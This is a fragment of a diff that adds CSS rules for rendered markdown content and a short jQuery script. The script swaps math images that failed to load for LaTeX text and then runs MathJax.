+      .markdown_views pre code {
+        color: unset;
+      }
+      .markdown_views code,
+      .markdown_views kbd,
+      .markdown_views pre,
+      .markdown_views samp {
+        font-family:
+          Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif;
+        font-size: 14px;
+        line-height: 22px;
+        color: #000;
+      }
+      .markdown_views code {
+        color: #c7254e;
+        background-color: #f9f2f4;
+        border-radius: 2px;
+      }
+      .markdown_views a {
+        text-decoration-skip: ink;
+        color: #4ea1db;
+        text-decoration: none;
+      }
+      .markdown_views a:focus,
+      .markdown_views a:hover {
+        text-decoration: none;
+        color: #ca0c16;
+      }
+      .markdown_views a:visited {
+        color: #6795b5;
+      }
+      .markdown_views .footnote {
+        vertical-align: top;
+        position: relative;
+        top: -4px;
+        font-size: 12px;
+      }
+      .markdown_views .footnotes ol li {
+        font-size: 14px;
+        line-height: 22px;
+        margin: 0 0 8px 24px;
+      }
+      .markdown_views .flow-chart,
+      .markdown_views .sequence-diagram {
+        text-align: center;
+        margin-bottom: 24px;
+        font-size: 14px !important;
+      }
+      .markdown_views .flow-chart svg,
+      .markdown_views .sequence-diagram svg {
+        width: unset;
+      }
+      .markdown_views .flow-chart [fill="#000000"],
+      .markdown_views .flow-chart [fill="#000"],
+      .markdown_views .flow-chart [fill="black"],
+      .markdown_views .sequence-diagram [fill="#000000"],
+      .markdown_views .sequence-diagram [fill="#000"],
+      .markdown_views .sequence-diagram [fill="black"] {
+        fill: #4f4f4f;
+      }
+      .markdown_views .flow-chart [stroke="#000000"],
+      .markdown_views .sequence-diagram [stroke="#000000"] {
+        stroke: #4f4f4f;
+      }
+      .markdown_views .MathJax_SVG_Display {
+        text-align: center;
+        margin: 24px 0;
+        font-size: 18px;
+        font-weight: 400;
+        color: #4f4f4f;
+        position: relative;
+        text-indent: 0;
+        max-width: none;
+        max-height: none;
+        min-width: 0;
+        min-height: 0;
+        width: 100%;
+      }
+      .markdown_views .toc {
+        font-size: 18px;
+        line-height: 24px;
+        margin: 0 0 24px;
+        padding: 0;
+      }
+      .markdown_views .toc ul {
+        margin: 0 0 8px;
+        padding: 0;
+      }
+      .markdown_views .toc ul ul {
+        padding-left: 24px;
+      }
+      .markdown_views .toc ul li {
+        list-style-type: none;
+        margin: 8px 0 0 24px;
+      }
+      .markdown_views dl dd {
+        margin: 0 0 8px 40px;
+      }
+      .markdown_views kbd {
+        padding: 2px 8px;
+        border: 1px solid rgba(63, 63, 63, 0.25);
+        box-shadow: 0 1px 0 rgba(63, 63, 63, 0.25);
+        background-color: #fff;
+        color: #333;
+        border-radius: 4px;
+        display: inline-block;
+        margin: 0 2px;
+        white-space: nowrap;
+      }
+      .markdown_views .katex-display {
+        overflow: hidden;
+        overflow-x: auto;
+        padding: 6px 0;
+      }
+      .markdown_views .katex .vlist-t2 {
+        margin-right: 0 !important;
+      }</style
+    ><style class="darkreader darkreader--sync" media="screen"></style>
+  </div>
+</article>
+<script>
+  $(function () {
+    setTimeout(function () {
+      var mathcodeList = document.querySelectorAll(
+        ".htmledit_views img.mathcode",
+      );
+      if (mathcodeList.length > 0) {
+        for (let i = 0; i < mathcodeList.length; i++) {
+          if (
+            mathcodeList[i].naturalWidth === 0 ||
+            mathcodeList[i].naturalHeight === 0
+          ) {
+            var alt = mathcodeList[i].alt;
+            alt = "\\(" + alt + "\\)";
+            var curSpan = $('<span class="img-codecogs"></span>');
+            curSpan.text(alt);
+            $(mathcodeList[i]).before(curSpan);
+            $(mathcodeList[i]).remove();
+          }
+        }
+        MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+      }
+    }, 1000);
+  });
+</script>
